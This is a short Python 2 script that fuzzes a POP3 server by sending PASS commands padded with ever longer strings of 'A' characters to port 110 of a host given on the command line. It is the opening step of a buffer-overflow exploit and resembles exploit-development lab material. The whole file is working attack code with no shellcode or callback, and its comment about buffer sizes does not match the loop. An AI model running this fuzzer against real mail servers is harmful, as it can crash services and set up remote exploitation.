#!/usr/bin/python
import socket
import sys
import time

# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer=["A"]
counter=2400
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200


for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	try:
	 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	 print "\nSending evil buffer..."
	 print string
	 s.connect((sys.argv[1],110)) # connect to IP, POP3 port
	 data = s.recv(1024) # receive banner
	 print data # print banner
	 s.send('USER test' +'\r\n') # send username "test"
	 data = s.recv(1024) # receive reply
	 print data # print reply
	 s.send('PASS' + string + ' test\r\n') # send password "test"
	 data = s.recv(1024) # receive reply
	 print data # print reply
	 s.send('QUIT\r\n')
	 s.close() # close socket
	 print "\nDone!"
	 time.sleep(3)
	except Exception as e:  
         print(e)	 
	 print "Could not connect to POP3!"
